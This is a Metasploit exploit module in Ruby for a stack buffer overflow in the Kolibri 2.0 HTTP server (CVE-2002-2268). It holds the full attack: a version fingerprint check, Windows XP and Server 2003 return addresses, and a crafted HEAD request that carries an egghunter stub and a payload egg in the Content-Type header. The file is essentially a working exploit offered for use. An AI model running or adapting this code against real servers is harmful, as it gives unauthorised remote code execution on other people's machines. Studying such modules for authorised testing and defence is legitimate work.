# $Id: kolibri_http.rb 10887 2011-08-03 12:19:19Z mr_me $
 
##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    HttpFingerprint = { :pattern => [ /kolibri-2\.0/ ] }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Kolibri <= v2.0 HTTP Server HEAD Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{This exploits a stack buffer overflow in version 2 of the Kolibri HTTP server.},
            &#039;Author&#039;         =>
                    [
                        &#039;mr_me <steventhomasseeley@gmail.com>&#039;, # msf
                        &#039;TheLeader&#039; # original exploit
                    ],
            &#039;Version&#039;        => &#039;$Revision: 10887 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2002-2268&#039; ],
                    [ &#039;OSVDB&#039;, &#039;70808&#039; ],
                    [ &#039;BID&#039;, &#039;6289&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/15834/&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 3000,
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => "\x00\x0d\x0a\x3d\x20\x3f",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP sp3&#039;, { &#039;Ret&#039; => 0x7E429353 } ] ,
                    [ &#039;Windows Server 2003 sp2&#039;, { &#039;Ret&#039; => 0x76F73BC3 } ] ,
                ],
            &#039;DisclosureDate&#039; => &#039;Dec 26 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def check
        info = http_fingerprint
        if info and (info =~ /kolibri-2\.0/)
            return Exploit::CheckCode::Vulnerable
        end
        Exploit::CheckCode::Safe
    end
 
    def exploit
        #7E429353    FFE4            JMP     ESP
        # For a reliable and large payload, we use an egg hunter
        # and direct RET to execute code
        print_status("Sending request...")
        eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars)
        sploit = Rex::Text.rand_text_alphanumeric(515) + [target.ret].pack(&#039;V&#039;)
        sploit << eh_stub
        send_request_raw({
            &#039;uri&#039;     => "/" + sploit,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039;  => &#039;HEAD&#039;,
            &#039;headers&#039; => {&#039;Content-Type&#039; => eh_egg},
        })
 
        handler
    end
 
end



